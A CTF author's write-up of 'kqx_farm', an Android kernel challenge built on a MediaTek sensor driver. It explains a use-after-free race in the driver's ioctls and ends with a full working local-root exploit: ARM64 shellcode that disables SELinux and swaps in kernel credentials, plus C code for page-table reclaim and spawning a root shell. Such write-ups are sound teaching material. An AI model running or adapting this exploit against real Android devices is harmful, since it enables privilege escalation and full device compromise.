+++
title = 'kqx_farm - TORX CTF 2026'
date = 2026-09-30T20:26:42+02:00
draft = false
author = 'leave'
summary = 'android kernel pwn challenge that I wrote for TORX CTF 2026'
tags = [
    'android kernel'
]
toc = true
image = '/images/kqx_farm/moo.png'
+++

## Description

have you ever ~~pwned an android phone~~ milked a cow?

## Challenge overview

The attachments contain two main components:
- an emulation setup: a **QEMU**-based VM that emulates the actual phone as closely as I could manage (at least for the purposes of the challenge);
- the source code for the loaded kernel driver.

There's also a big `README.md` explaining how interaction with the physical phone works, since TORX CTF was held on-site in Milan.

## MediaTek sensor stack

To understand the challenge, I'll give you some background on how android's sensor stack works and how MediaTek and Motorola implement it. I'll assume the reader has no prior knowledge of the android kernel.

### SCP

It all starts from the **SCP** (Sensor Co-Processor), a separate chip that detects and classifies movements. android defines many built-in "movements" that the **SCP** can recognize:

[https://github.com/MotorolaMobilityLLC/kernel-mtk/blob/android-16-release-w1wn36.18-114/drivers/misc/mediatek/sensor/2.0/core/hf_sensor_type.h](https://github.com/MotorolaMobilityLLC/kernel-mtk/blob/android-16-release-w1wn36.18-114/drivers/misc/mediatek/sensor/2.0/core/hf_sensor_type.h)

We'll use this repository as a reference, since it contains the kernel build shipped on the actual phone.

From there, we can see the sensors defined by **AOSP**, as well as the fact that chipset vendors and individual manufacturers can implement their own sensors. For example, `SENSOR_TYPE_CHOPCHOP_GESTURE = 99` is a Motorola-specific gesture sensor ([gesture](https://help.motorola.com/hc/1796/12/global/en-us/index.html?t=T1610115547)).

Now we have a better idea of what a "movement" means here: sensors such as the accelerometer, gyroscope, and gravity sensor.

### hf_manager

Sensor event handling is implemented by MediaTek's `hf_manager.ko` kernel driver. There's actually another abstraction layer in between, implemented by the `sensorhub.ko` driver. It isn't relevant to this challenge, though.

For each sensor, there's a **device** (which "describes" the sensor) and a **manager** (which handles configuration and event reporting).

To interact with a manager, you first need to register a **client**. This can be done either from userspace through `/dev/hf_manager` or from another kernel driver through the exposed API.

### HAL & applications

Consistent with android's security model, `/dev/hf_manager` isn't directly accessible to applications because access is restricted by SELinux rules. However, android exposes a so-called **HAL** (Hardware Abstraction Layer) that acts as a middleman between the kernel driver and applications. This way, only certain operations and parameters supplied by a potential userspace attacker reach the kernel driver.

Recalling Motorola's "Fast Flashlight" feature I mentioned earlier, a daemon called `MotoActions` registers a client for the "chopchop" gesture through the HAL and polls for events, matching the current state of the flashlight and deciding whether to turn it on or off.

As another example, switching the flashlight can't be done by interacting directly with `/dev/flashlight`; the request must go through the corresponding HAL.

Just for the sake of completeness, HALs expose the "features" they support (and allow applications to use) through **Binder**, android's core IPC mechanism, which allows processes to communicate safely with one another.

## The challenge

Now that we've covered some background on android's security model and how applications can safely interact with kernel drivers, let's throw all this shit in the toilet and build a kernel driver that's directly accessible to userspace 🗣🗣

The source code is split across three files:
- **`driver.c`**: character device registration;
- **`cow.c`**: **`MILKING_SENSOR`** implementation;
- **`classifier.c`**: milking-stroke detector (as stated in `README.md`, this code is out of scope).

As you can guess, the driver allows an application to interact with sensors and, in particular, registers a new sensor called **`MILKING_SENSOR`**, which detects phone movements that resemble a milking stroke.

![setup](/images/kqx_farm/setup.png)

And given this setup, everything is obvious: you'll have to milk that cow.

### driver.c

The character device exposes features through `ioctl` and `read`:

`CREATE_CLIENT`:
- calls `hf_client_create` and stores the resulting client object in `private_data`;
- calls `hf_client_control_sensor` to configure the client with the following parameters:
  - sensor type;
  - sampling rate;
  - delay;
  - latency;
- deletes the client if configuration fails.

`DELETE_CLIENT`:
- calls `hf_client_destroy` (you can guess what it does).

`READ`:
- polls the events reported to that client and copies them to userspace.

`COW_REPORT_STROKE`:
- an additional `ioctl` shipped **only** in the emulation setup, intended to substitute the physical stroke.

### cow.c

`init`:
- registers the device;
- registers the manager;
- starts `latency_strokes_kthread`;
- starts the classifier:
  - whenever the classifier detects a stroke, it calls `report_stroke` with the stroke data (as stated in `README.md`, the classifier's implementation is out of scope).

`report_stroke`:
- adds the detected stroke to the `latency_queue`.

`latency_strokes_kthread`:
- polls the `latency_queue` and checks whether `milk_latency` nanoseconds have elapsed since a given stroke was detected. This is the implementation of the latency sensor specification: it commits an event to the client after `latency` nanoseconds.
- if the grace period has passed, reports that event to the client and removes it from the `latency_queue`.

`milking_batch`:
- configuration callback for `milking_device`: sets the global `milk_latency` variable through the `CREATE_CLIENT` `ioctl`;
- loops until the `latency_queue` is empty; only then does it commit the new `milk_latency`:
  - `latency_strokes_kthread` processes the queue in FIFO order, so it assumes the event at the head is the oldest one. Instead of walking the whole list, it can just check whether the grace period has passed for the oldest event; if it hasn't, it surely hasn't passed for any more recent ones.
  - committing a new `milk_latency` while the `latency_queue` is populated would invalidate this invariant, so the callback waits for the queue to become empty.
- this callback is called internally by `hf_client_control_sensor` whenever a client is configured with a latency shorter than `milk_latency`.

Now you have everything you need. Can you spot the two vulns?

### The vulns

There are two vulns in the driver: one leads to memory corruption, while the other (spoiler) lets us arbitrarily extend the race window.

**Memory corruption:**

```c
*client = hf_client_create();
if (!*client)
    return -ENOMEM;

ret = control_sensor(*client, config);
```

The `CREATE_CLIENT` `ioctl` stores the client in `private_data` and then configures it. Since there are no global locks protecting this sequence, we can call `DELETE_CLIENT` while `control_sensor` is running, triggering a **UAF** on the `hf_client` struct.

Let's find a useful operation in `hf_client_control_sensor` to exploit this UAF:

`hf_client_control_sensor` -> `hf_manager_drive_device` -> `hf_manager_save_update_enable`

```c
struct hf_client {
    struct list_head list;
    struct hf_client_fifo hf_fifo;
    struct sensor_state request[SENSOR_TYPE_SENSOR_MAX];
    spinlock_t request_lock;
    struct hf_core *core;

    /* record process info */
    char proc_comm[TASK_COMM_LEN]; /* process name */
    pid_t leader_pid;              /* process pid */
    pid_t pid;                     /* control thread pid */
    pid_t ppid;                    /* poll thread pid */
};

static inline void hf_manager_save_update_enable(struct hf_client *client,
    struct hf_manager_cmd *cmd, struct sensor_state *old)
{
    unsigned long flags;
    struct hf_manager_batch *batch = (struct hf_manager_batch *)cmd->data;
    struct sensor_state *request = &client->request[cmd->sensor_type];

    spin_lock_irqsave(&client->core->client_lock, flags);
    /* only enable disable update action delay and latency */
    if (cmd->action == HF_MANAGER_SENSOR_ENABLE) {
        /*
         * NOTE: save significant parameter to old
         * remember mustn't save flush bias raw etc
         * down_sample_cnt and down_sample_div mustn't save due to
         * own_sample_update called in hf_manager_device_enable
         * when enable disable and batch device success
         */
        old->enable = request->enable;
        old->down_sample = request->down_sample;
        old->delay = request->delay;
        old->latency = request->latency;
        old->start_time = request->start_time;
        /* update new */
        if (!request->enable)
            request->start_time = ktime_get_boottime_ns();
        request->enable = true;
        request->down_sample = cmd->down_sample;
        request->delay = batch->delay;
        request->latency = batch->latency;
...
```

`request` is an offset within `client`, which is the object being used after being freed. As we can see, this function writes:

```c
request->delay = batch->delay;
request->latency = batch->latency;
```

Both `delay` and `latency` are 64-bit values fully controlled by userspace.

But let's step back for a moment. This is a hard race to hit. Can we somehow make the race window bigger? **FUSE** and **UFFD** are both disabled on the phone.

We said that we can make `milking_batch` loop until the `latency_queue` is empty. Whenever a stroke is detected, the queue remains populated for `milk_latency` nanoseconds, and that value is user-configurable.

This means we can make `milking_batch` loop for an arbitrary amount of time (yes, by stroking the phone).

`milking_batch` is called by:

`hf_client_control_sensor` -> `hf_manager_drive_device` -> `hf_manager_device_enable` -> `milking_batch`

Obviously, this happens only when a client is configured with a shorter latency and is registered for `MILKING_SENSOR`.

Now notice that `hf_manager_drive_device` acquires a lock before calling both `hf_manager_save_update_enable` (which performs the relevant UAF write) and `hf_manager_device_enable` (which triggers the loop). The lock in question is:

```c
struct hf_core *core = client->core;
mutex_lock(&core->manager_lock);
```

`client->core` is a driver-global object shared between every client.

You know what that means?

While `milking_batch` is looping, `manager_lock` remains held. If we concurrently create another client, it will block while trying to acquire that lock, hanging until our user-controlled loop ends. Since the lock is acquired before the relevant `request->latency` write, we can call `DELETE_CLIENT` on that client and trigger the UAF write described earlier.

### The exploit

The UAF gives us an arbitrary write into a `struct hf_client`, which is allocated from `kmalloc-2k`. The easiest way to exploit this is to get the victim slab returned to the buddy allocator and reclaim its pages as page tables.

`kmalloc-2k` is a very large cache, and like all large caches, it's kinda ass to exploit. Each slab is allocated as an order-3 block, whereas page tables use order-0 allocations. So we need to "move" the UAF'd `kmalloc-2k` allocation from order-3 to order-0.

Suppose we've managed to force the SLUB allocator to return the victim slab to the buddy allocator. The order-3 allocation now resides in the order-3 PCP list, a per-CPU cache specific to that allocation order. Pages in one PCP list won't move directly to another PCP list. In practice, the order-0 PCP list reclaims pages from the buddy allocator's `free_area`, not from other PCP lists. So we need an intermediate step: force the buddy allocator to move a page from a PCP list into `free_area`. This is easy to trigger because the buddy allocator uses thresholds to determine when pages are returned from PCP lists to `free_area`. So yeah, just spray a lot.

Another problem we have to look after is:

```c
static inline void hf_manager_save_update_enable(struct hf_client *client,
    struct hf_manager_cmd *cmd, struct sensor_state *old)
{
    unsigned long flags;
    struct hf_manager_batch *batch = (struct hf_manager_batch *)cmd->data;
    struct sensor_state *request = &client->request[cmd->sensor_type];

--> spin_lock_irqsave(&client->core->client_lock, flags);
    /* only enable disable update action delay and latency */
    if (cmd->action == HF_MANAGER_SENSOR_ENABLE) {
...
```

As we can see, this code dereferences `client->core`. If the memory previously occupied by the client struct has been reclaimed as a page table, this access can trigger a null-pointer dereference.

How can we handle this?

Let's have another look at `struct hf_client`:

```c
struct sensor_state request[SENSOR_TYPE_SENSOR_MAX];
spinlock_t request_lock;
struct hf_core *core;
```

So we care about `request` and `core`. `sensor_state` is a 32-byte struct, and `SENSOR_TYPE_SENSOR_MAX` is large.

Okay, and? Well, a `kmalloc-2k` object spans two pages. The state for `SENSOR_TYPE_MILKING` is located in the first page, while the `core` pointer is in the second. Nobody forces us to reclaim both pages as page tables. We can reclaim the first page as a page table and the second as a user-controlled object (like a pipe page), where we can "fake" a pointer to avoid triggering a null-pointer dereference. The only constraint is that the fake pointer must point to memory containing zeroes.

Now we can outline the steps:
- spray reclaim processes that allocate many pipes (only call `pipe()` so the `file` structs and `inode`s don't create noise);
- spray `hf_client`s that will later be freed to flush the PCP lists (and which will initialize `milk_latency`, so the value specified here determines the actual hang time);
- **STROKE THAT COW, BABY!!** 🐮🐮🐮🐮🐮🐮🐮🐮🐮🐮🐮🐮
- allocate a new `hf_client` with a shorter latency to trigger the `manager_lock` hold;
- spray attacker clients (using threads, since the calls won't return immediately) that will perform the write (in this configuration, the `latency` field will contain the fake **PTE** to inject into the page table);
- ret2buddy:
  - free some objects to reduce `kmalloc-2k` noise;
  - free the attacker clients to make them eligible to be returned to the buddy allocator;
  - free all the PCP-flushing clients to trigger the attackers' return to the buddy allocator and flush the PCP lists;
- resume the reclaim tasks;
  - spray alternating pipe pages and page tables to reclaim the UAF'd `hf_client` (to fake the `core->manager_lock` thing, we can use a vmalloc address, since it isn't randomized on ARM);
  - wait for the attacker threads to return (meaning the write has been performed);
  - scan the sprayed pages to find the corrupted page;
  - write shellcode into kernel code;
  - win.

## Full exploit

```asm
.global _start
.text

_start:
    ldr x20, [sp, #24]
    ldr x10, =0x92980
    sub x20, x20, x10               // kbase in x20

    // selinux_state
    eor x0, x0, x0
    ldr x10, =0x2d9ad88
    add x10, x20, x10
    strb w0, [x10]

    // find_task_by_vpid
    ldr x0, =0x31313131     // pid
    ldr x10, =0x16d308
    add x10, x20, x10
    blr x10
    mov x21, x0

    // prepare_kernel_cred
    eor x0, x0, x0
    ldr x10, =0x17a9dc
    add x10, x20, x10
    blr x10

    // creds
    ldr x10, =0x798
    add x10, x21, x10
    str x0, [x10]

    // msleep
    ldr x0, =0x69696969
    ldr x10, =0x25a940
    add x10, x20, x10
    blr x10
```

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <linux/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/fcntl.h>


#define DEVICE                  "/dev/sensor"

#define SENSOR_TYPE_MILKING     84
#define CREATE_CLIENT           0x1337
#define DELETE_CLIENT           0x1338

#define HANG_TIME               6000000000LL

#define PCP                     256
#define PARTIAL                 8
#define CACHE_SIZE              4

#define ROUNDS                  0x20
#define RECLAIM                 1500
#define THP                     0x200000
#define ADDRESS                 (THP*THP)

#define PIVOT_ROOT              0x4059ab50

struct sensor_config {
    __u64 delay_ns;
    __u64 latency_ns;
    __u32 sensor_type;
    __u32 down_sample;
};

struct milk_stroke {
    long timestamp;
    int strength_milli;
    unsigned int duration_ms;
};

struct client_arg {
    int *fd;
    long latency;
    int idx;
};

static sigjmp_buf env;
char* fork_sem;
char shellcode[] = {0xf4, 0xf, 0x40, 0xf9, 0xea, 0x2, 0x0, 0x58, 0x94, 0x2, 0xa, 0xcb, 0x0, 0x0, 0x0, 0xca, 0xca, 0x2, 0x0, 0x58, 0x8a, 0x2, 0xa, 0x8b, 0x40, 0x1, 0x0, 0x39, 0xa0, 0x2, 0x0, 0x58, 0xca, 0x2, 0x0, 0x58, 0x8a, 0x2, 0xa, 0x8b, 0x40, 0x1, 0x3f, 0xd6, 0xf5, 0x3, 0x0, 0xaa, 0x0, 0x0, 0x0, 0xca, 0x6a, 0x2, 0x0, 0x58, 0x8a, 0x2, 0xa, 0x8b, 0x40, 0x1, 0x3f, 0xd6, 0x4a, 0x2, 0x0, 0x58, 0xaa, 0x2, 0xa, 0x8b, 0x40, 0x1, 0x0, 0xf9, 0x20, 0x2, 0x0, 0x58, 0x4a, 0x2, 0x0, 0x58, 0x8a, 0x2, 0xa, 0x8b, 0x40, 0x1, 0x3f, 0xd6, 0x0, 0x0, 0x0, 0x0, 0x80, 0x29, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xad, 0xd9, 0x2, 0x0, 0x0, 0x0, 0x0, 0x31, 0x31, 0x31, 0x31, 0x0, 0x0, 0x0, 0x0, 0x8, 0xd3, 0x16, 0x0, 0x0, 0x0, 0x0, 0x0, 0xdc, 0xa9, 0x17, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x69, 0x69, 0x69, 0x0, 0x0, 0x0, 0x0, 0x40, 0xa9, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0};

void pin_cpu(int core) {
    cpu_set_t cpu;

    CPU_ZERO(&cpu);
    CPU_SET(core, &cpu);

    sched_setaffinity(0, sizeof(cpu), &cpu);
}

static void segv_handler(int sig) {
    (void)sig;
    siglongjmp(env, 1);
}

int sem = -(CACHE_SIZE*PCP);
void new_client(int *fd, long latency) {
    *fd = open(DEVICE, O_RDONLY);
    // printf("%d\n", *fd);

    struct sensor_config config;

    config.delay_ns = 0;
    config.latency_ns = latency;
    config.sensor_type = SENSOR_TYPE_MILKING;
    config.down_sample = 0;

    sem++;
    ioctl(*fd, CREATE_CLIENT, &config);
}


void close_client(int fd) {
    ioctl(fd, DELETE_CLIENT, NULL);
}


void *client_thread(void *arg) {
    struct client_arg *a = arg;
    while(sem != a->idx){};

    new_client(a->fd, a->latency);
    // puts("thread exiting");
    sem--;

    return NULL;
}

void reclaim() {
    int pipes[RECLAIM][2];
    for (int i=0; i<RECLAIM; i++) {
        pipe(&pipes[i]);
    }

    while(!fork_sem[1]) {};

    char buffer[0x1000];
    memset(buffer, 0x69, 0x1000);
    *(unsigned long*) &buffer[0x960] = 0xffffffc008000000;      // vmalloc start
    char* pages[RECLAIM];

    for (int i=0; i<RECLAIM; i++) {
        pages[i] = (char*) mmap((void*) (ADDRESS + THP*i), 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        write(pipes[i][1], buffer, sizeof(buffer));
    }

    while(!fork_sem[2]) {}

    char* page = NULL;
    unsigned long needle;
    for (int i=0; i<RECLAIM; i++) {
        page = pages[i] + 0x1fd000;
        if (sigsetjmp(env, 1) == 0) {
            needle = *page;
            break;
        }
    }
    if (!needle)
        return;
    
    int pid = fork();
    if (!pid) {
        while(getuid()) {};
        system("/system/bin/sh");
        while(1) {};
    }

    *(int*) memmem(shellcode, sizeof(shellcode), "1111", 4) = pid;
    memcpy(&page[(PIVOT_ROOT & 0xfff)], shellcode, sizeof(shellcode));

    syscall(41);            // pivot_root
    while(1) {};
}

int main(void) {
    pin_cpu(0);

    fork_sem = (char*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }


    struct sigaction sa = {
        .sa_handler = segv_handler
    };
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);


    for (int i=0; i<ROUNDS; i++) {
        if (!fork()) {
            reclaim();
            return 0;
        }
    } 

    int fds1[PCP][CACHE_SIZE];
    for (int i = 0; i < PCP; i++) {
        for (int j = 0; j < CACHE_SIZE; j++) {
            fds1[i][j] = -1;
            new_client(&fds1[i][j], HANG_TIME);
        }
    }

    // STROKE
    puts("stroke me");
    getchar();

    int tmp = -1;
    if (!fork()) {
        new_client(&tmp, HANG_TIME-1);
        return 0;
    }

    sleep(1);
    int fds2[PARTIAL][CACHE_SIZE];
    pthread_t threads[PARTIAL][CACHE_SIZE];
    struct client_arg args[PARTIAL][CACHE_SIZE];

    memset(fds2, -1, sizeof(fds2));
    for (int i=0; i<PARTIAL; i++) {
        for (int j=0; j<CACHE_SIZE; j++) {
            args[i][j].fd = &fds2[i][j];
            args[i][j].latency = (PIVOT_ROOT & (~0xfff)) | 0x00e8000000000f43;
            args[i][j].idx = i*CACHE_SIZE + j;

            int ret = pthread_create(&threads[i][j], NULL, client_thread, &args[i][j]);
        }
    }

    sleep(2);
    
    // ret2buddy
    for (int i=0; i<16; i++) {
        for (int j=0; j<CACHE_SIZE; j++)
            close_client(fds1[i][j]);
    }

    for (int i=0; i<2; i++) {
        for (int j=0; j<CACHE_SIZE; j++)
            close_client(fds2[i][j]);
    }

    for (int i=16; i<PCP; i++) {
        for (int j=0; j<CACHE_SIZE; j++)
            close_client(fds1[i][j]);
    }

    // reclaim
    puts("start reclaim");
    fork_sem[1] = 0x69;

    // wait for threads to return
    while(sem) {};
    puts("thread returned");
    fork_sem[2] = 0x69;

    while(1) {};
    return 0;
}
```